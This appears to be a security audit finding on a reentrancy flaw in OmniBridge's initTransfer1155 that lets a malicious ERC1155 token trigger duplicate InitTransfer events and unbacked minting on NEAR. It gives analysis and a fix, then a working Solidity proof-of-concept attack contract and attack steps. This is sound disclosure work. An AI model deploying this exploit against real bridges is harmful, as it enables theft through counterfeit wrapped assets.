### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Enables Unbacked `InitTransfer` Event Emission — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary
`initTransfer1155` in `OmniBridge.sol` makes an external call to an attacker-controlled ERC1155 contract (`IERC1155(tokenAddress).safeTransferFrom(...)`) after incrementing `currentOriginNonce` but before emitting `InitTransfer`. A malicious ERC1155 token can reenter `initTransfer1155` during that callback, causing two `InitTransfer` events to be emitted with distinct nonces while zero or one actual token transfers occur. The NEAR side processes each unique `(origin_chain, origin_nonce)` pair independently, minting wrapped tokens for both events — producing unbacked supply.

---

### Finding Description

`initTransfer1155` has the following execution order: [1](#0-0) 

1. `currentOriginNonce += 1` (nonce = N) — state updated.
2. `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — **external call to attacker-controlled contract**.
3. `emit InitTransfer(...)` — event emitted after the external call.

The ERC1155 standard requires `safeTransferFrom` to call `onERC1155Received` on the recipient (`address(this)`). OmniBridge implements this hook: [2](#0-1) 

The hook only rejects calls where `operator != address(this)`. Because OmniBridge itself is the operator (it called `safeTransferFrom`), the check passes unconditionally — including during a reentrant call.

A malicious ERC1155 token can exploit this as follows inside its `safeTransferFrom`:
- Call back into `initTransfer1155` (reentrancy).
- The reentrant call increments `currentOriginNonce` to N+1 and emits `InitTransfer` with nonce N+1.
- Control returns to the outer `safeTransferFrom`, which may transfer zero tokens and returns normally.
- The outer `initTransfer1155` emits `InitTransfer` with nonce N.

Result: **two `InitTransfer` events emitted, zero or one actual token transfers**.

No reentrancy guard is present. The contract imports do not include `ReentrancyGuard`: [3](#0-2) 

`logMetadata1155` is permissionless — any caller can register any ERC1155 token address, causing the NEAR side to recognize it: [4](#0-3) 

The NEAR side processes `InitTransfer` events by `(origin_chain, origin_nonce)` uniqueness. Since nonces N and N+1 are distinct, both events are processed independently.

---

### Impact Explanation

**Critical.** The attacker emits two valid `InitTransfer` events for a single (or zero) token lock. The NEAR bridge mints wrapped tokens for both events, creating unbacked supply — unauthorized creation of wrapped bridge assets. This directly breaks the 1:1 backing guarantee of the bridge.

---

### Likelihood Explanation

**High.** The attack requires only:
1. Deploying a malicious ERC1155 contract (trivial, no privileged access needed).
2. Calling permissionless `logMetadata1155` to register it on NEAR.
3. Calling `initTransfer1155` with the malicious token.

No leaked keys, no MPC collusion, no privileged role required. The attacker is a fully unprivileged user.

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to all external functions that make external calls: `initTransfer`, `initTransfer1155`, `finTransfer`, `deployToken`, and `logMetadata`. This is the standard defense and aligns with the documented invariant "State before external calls" which is necessary but not sufficient without a mutex.

---

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // ERC1155 safeTransferFrom — does NOT actually transfer tokens
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter initTransfer1155 — gets nonce N+1, emits InitTransfer(N+1)
            bridge.initTransfer1155(address(this), tokenId, uint128(amount), 0, 0, "attacker.near", "");
        }
        // Outer call: returns without transferring any tokens
        // onERC1155Received is NOT called here — malicious token skips it
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. Call bridge.logMetadata1155(maliciousERC1155, tokenId)  ← permissionless
// 3. Call bridge.initTransfer1155(maliciousERC1155, tokenId, amount, 0, 0, "attacker.near", "")
//    → emits InitTransfer(nonce=N+1) from reentrant call
//    → emits InitTransfer(nonce=N)   from outer call
//    → 0 tokens locked in OmniBridge
// 4. NEAR processes both events → mints wrapped tokens twice → unbacked supply
